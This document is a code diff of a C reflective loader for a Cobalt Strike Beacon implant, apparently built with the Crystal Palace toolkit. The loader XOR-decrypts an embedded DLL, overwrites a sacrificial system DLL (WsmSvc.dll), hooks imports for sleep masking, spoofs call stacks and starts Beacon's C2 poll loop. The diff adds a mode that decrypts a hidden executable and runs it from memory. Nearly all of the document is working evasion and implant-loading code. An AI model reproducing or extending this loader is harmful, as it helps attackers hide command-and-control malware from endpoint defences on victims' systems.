@@ -5,6 +5,7 @@
 #include "definitions.h"
 #include "sleep/memory.h"
 #include "draugr/spoof.h"
+#include "exe_loader.h"
 
 WINBASEAPI HANDLE   WINAPI KERNEL32$CreateFileW         (LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 WINBASEAPI BOOL     WINAPI KERNEL32$CloseHandle         (HANDLE);
@@ -26,14 +27,12 @@ extern PVOID calculate_function_stack_size_wrapper(PVOID return_address);
 
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
-/* ── Universal DLL Loader Configuration ────────────────────────── */
-/* Set to 1 to support any Windows DLL (not just Beacon)
-   Set to 0 for Beacon-specific optimizations (default) */
-#ifndef UNIVERSAL_DLL_MODE
-#define UNIVERSAL_DLL_MODE 0
+/* ── Execution Mode Selection ──────────────────────────────────────── */
+#ifndef EXECUTION_MODE
+#define EXECUTION_MODE 0   /* 0 = DLL (Beacon), 1 = EXE (Native) */
 #endif
 
-/* ── Crystal Palace embedded sections ─────────────────────────────── */
+/* ── Crystal Palace embedded sections ──────────────────────────────── */
 
 char __DLLDATA__ [0] __attribute__((section("cobalt_dll")));
 char __MASKDATA__[0] __attribute__((section("cobalt_mask")));
@@ -70,7 +69,7 @@ void findNeededFunctions(WIN32FUNCS * funcs) {
     funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA)*) findFunctionByHash(hModule, GETMODULEHANDLEA_HASH);
 }
 
-/* ── fix_section_permissions ───────────────────────────────────────── */
+/* ── DLL Mode: Original Beacon functionality ────────────────────────── */
 
 void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY * dll_memory )
 {
@@ -86,7 +85,6 @@ void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY
 
     for ( int i = 0; i < section_count; i++ )
     {
-        /* skip BSS — SizeOfRawData=0 means nothing to mask */
         if ( !section_hdr->SizeOfRawData || !section_hdr->VirtualAddress ) {
             section_hdr++;
             continue;
@@ -111,8 +109,6 @@ void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY
         if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
             new_protect = PAGE_EXECUTE_READWRITE;
 
-        /* set permissions — CurrentProtect must match actual page
-         * protection so xor_section logic works correctly          */
         KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );
 
         dll_memory->Sections[ tracked ].BaseAddress     = section_dst;
@@ -126,8 +122,6 @@ void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY
 
     dll_memory->Count = tracked;
 }
-
-/* ── LoadSacrificialDll ────────────────────────────────────────────── */
 
 BOOL LoadSacrificialDll(IN LPCWSTR szDllFilePath, OUT HMODULE * phModule) {
     HANDLE   hFile    = INVALID_HANDLE_VALUE;
@@ -154,8 +148,6 @@ BOOL LoadSacrificialDll(IN LPCWSTR szDllFilePath, OUT HMODULE * phModule) {
     *phModule = (HMODULE)mapped;
     return TRUE;
 }
-
-/* ── TransferExecutionViaStack ─────────────────────────────────────── */
 
 VOID TransferExecutionViaStack(PVOID entry_point, HINSTANCE hInstance, DWORD fdwReason) {
     PVOID kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
@@ -193,22 +185,15 @@ VOID TransferExecutionViaStack(PVOID entry_point, HINSTANCE hInstance, DWORD fdw
     NTDLL$NtContinue(&ctx, FALSE);
 }
 
-/* ── ModuleOverload ────────────────────────────────────────────────── */
-
 void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     HMODULE hSacrificial = NULL;
     DLLDATA cobaltData;
     DWORD   oldProt = 0;
 
-    /* funcs start with real LoadLibraryA/GetProcAddress.
-     * setup_hooks will replace GetProcAddress with _GetProcAddress
-     * which consults the addhook table built by Crystal Palace.     */
-
     IMPORTFUNCS funcs;
     funcs.LoadLibraryA   = LoadLibraryA;
     funcs.GetProcAddress = GetProcAddress;
 
-    /* XOR-decrypt DLL */
     RESOURCE * masked_dll = (RESOURCE *)findAppendedDLL();
     RESOURCE * mask_key   = (RESOURCE *)findMask();
 
@@ -222,13 +207,11 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
 
     ParseDLL(dll_raw_src, &cobaltData);
 
-    /* Map sacrificial DLL */
     if (!LoadSacrificialDll(SacrificialDllPath, &hSacrificial)) {
         KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
         return;
     }
 
-    /* Size check — sacrificial DLL must fit DLL's full image */
     PIMAGE_NT_HEADERS pSacNt = (PIMAGE_NT_HEADERS)(
         (ULONG_PTR)hSacrificial +
         ((PIMAGE_DOS_HEADER)hSacrificial)->e_lfanew);
@@ -240,9 +223,6 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
         return;
     }
 
-    /* Make sacrificial memory writable section-by-section.
-     * A single VirtualProtect on SEC_IMAGE memory is not reliable —
-     * the kernel enforces per-section protections on image views.   */
     KERNEL32$VirtualProtect(hSacrificial, 0x1000, PAGE_READWRITE, &oldProt);
 
     PIMAGE_SECTION_HEADER pSacSec = IMAGE_FIRST_SECTION(pSacNt);
@@ -257,14 +237,10 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
             secSize, PAGE_READWRITE, &oldProt);
     }
 
-    /* Zero target region — clears WsmSvc content so DLL's BSS
-     * globals start at zero rather than WsmSvc garbage              */
     NTDLL$memset((char *)hSacrificial, 0, beaconSize);
 
-    /*  Copy DLL — LoadDLL handles headers, sections, relocations */
     LoadDLL(&cobaltData, dll_raw_src, (char *)hSacrificial);
 
-    /* Load PICO  */
     char * pico_src  = findPico();
     char * pico_data = KERNEL32$VirtualAlloc(NULL, PicoDataSize(pico_src),
                                               MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
@@ -279,20 +255,11 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     KERNEL32$VirtualProtect(pico_code, PicoCodeSize(pico_src),
                              PAGE_EXECUTE_READ, &old_protect);
 
-    /* setup_hooks replaces funcs.GetProcAddress with _GetProcAddress.
-     * _GetProcAddress calls __resolve_hook first — if the name matches
-     * an addhook entry (Sleep, ExitThread, etc) it returns the hook
-     * function pointer instead of the real API.                      */
     ((SETUP_HOOKS) PicoGetExport(pico_src, pico_code,
                                   __tag_setup_hooks()))(&funcs);
     
-    /* ProcessImports with hooked funcs.
-     * When DLL's import table is resolved, every call to
-     * _GetProcAddress("Sleep") returns _Sleep, ("ExitThread") returns
-     * _ExitThread etc — wiring all hooks into DLL's live IAT.     */
     ProcessImports(&funcs, &cobaltData, (char *)hSacrificial);
 
-    /* Fix section permissions and track for sleep mask */
     MEMORY_LAYOUT memory;
     NTDLL$memset(&memory, 0, sizeof(memory));
 
@@ -304,7 +271,6 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     fix_section_permissions(&cobaltData, dll_raw_src,
                              (char *)hSacrificial, &memory.Dll);
 
-    /* Register .pdata so unwinder can walk DLL frames */
     IMAGE_DATA_DIRECTORY * pExcept =
         &cobaltData.NtHeaders->OptionalHeader
              .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -315,50 +281,16 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
         KERNEL32$RtlAddFunctionTable(pRF, count, (DWORD64)hSacrificial);
     }
 
-    /* Protect headers RO */
     KERNEL32$VirtualProtect(hSacrificial,
                              cobaltData.OptionalHeader->SizeOfHeaders,
                              PAGE_READONLY, &oldProt);
 
-    /* Pass memory layout to PICO */
     ((SETUP_MEMORY) PicoGetExport(pico_src, pico_code,
                                    __tag_setup_memory()))(&memory);
 
-    /* Get entry point and free decrypted buffer which contains signatures */
     DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
     KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
 
-    /* ─────────────────────────────────────────────────────────────
-       Universal DLL Mode: Choose execution model based on compilation flag
-       ───────────────────────────────────────────────────────────── */
-
-#if UNIVERSAL_DLL_MODE
-
-    /* ✅ UNIVERSAL DLL MODE
-       Standard Windows DLL execution:
-       - Single DLL_PROCESS_ATTACH call
-       - DLL executes and returns normally
-       - Supports any standard Windows DLL */
-    
-    FUNCTION_CALL call = { 0 };
-    call.ptr     = (PVOID) entry;
-    call.argc    = 3;
-    call.args[0] = (ULONG_PTR) hSacrificial;
-    call.args[1] = (ULONG_PTR) DLL_PROCESS_ATTACH;
-    call.args[2] = (ULONG_PTR) NULL;
-    spoof_call(&call);
-    
-    /* For universal DLL, execution ends here after DllMain completes
-       Control returns to the caller - standard Windows DLL behavior */
-
-#else
-
-    /* ❌ BEACON MODE (Default)
-       Beacon-specific two-phase execution:
-       - Phase 1: DLL_PROCESS_ATTACH for initialization
-       - Phase 2: reason=0x4 for C2 poll loop (never returns) */
-    
-    /* Phase 1: reason=1 — decrypts Beacon config, returns */
     FUNCTION_CALL call = { 0 };
     call.ptr     = (PVOID) entry;
     call.argc    = 3;
@@ -367,17 +299,48 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     call.args[2] = (ULONG_PTR) NULL;
     spoof_call(&call);
 
-    /* Phase 2: reason=4 — Beacon's C2 poll loop via clean fake stack, never returns */
     TransferExecutionViaStack((PVOID)entry, hSacrificial, 0x4);
+}
 
-#endif
+/* ── EXE Mode: Native executable execution ────────────────────────── */
+
+void ExecuteNativeExe(const char* exe_cmdline) {
+    RESOURCE * masked_exe = (RESOURCE *)findAppendedDLL();
+    RESOURCE * mask_key   = (RESOURCE *)findMask();
+
+    char * exe_raw_src = KERNEL32$VirtualAlloc(NULL, masked_exe->len,
+                                                MEM_COMMIT | MEM_RESERVE,
+                                                PAGE_READWRITE);
+    if (!exe_raw_src) return;
+
+    /* XOR-decrypt EXE */
+    for (int i = 0; i < masked_exe->len; i++)
+        exe_raw_src[i] = masked_exe->value[i] ^ mask_key->value[i % mask_key->len];
+
+    /* Initialize PE context and execute */
+    PE_CONTEXT ctx;
+    NTDLL$memset(&ctx, 0, sizeof(ctx));
     
+    execute_exe_from_memory((BYTE*)exe_raw_src, masked_exe->len, exe_cmdline, &ctx);
+
+    /* execute_exe_from_memory never returns (calls NtContinue) */
+    KERNEL32$VirtualFree(exe_raw_src, 0, MEM_RELEASE);
 }
 
 /* ── Entry point ───────────────────────────────────────────────────── */
 
 __attribute__((noinline, no_reorder)) void go() {
+#if EXECUTION_MODE == 1
+    /* EXE mode: Execute native executable */
+    /* Command line argument is passed via compilation */
+    #ifndef EXE_CMDLINE
+    #define EXE_CMDLINE ""
+    #endif
+    ExecuteNativeExe(EXE_CMDLINE);
+#else
+    /* DLL mode: Original Beacon functionality (default) */
     ModuleOverload(L"C:\\Windows\\System32\\WsmSvc.dll");
+#endif
 }
 
 FARPROC resolve(DWORD modHash, DWORD funcHash) {
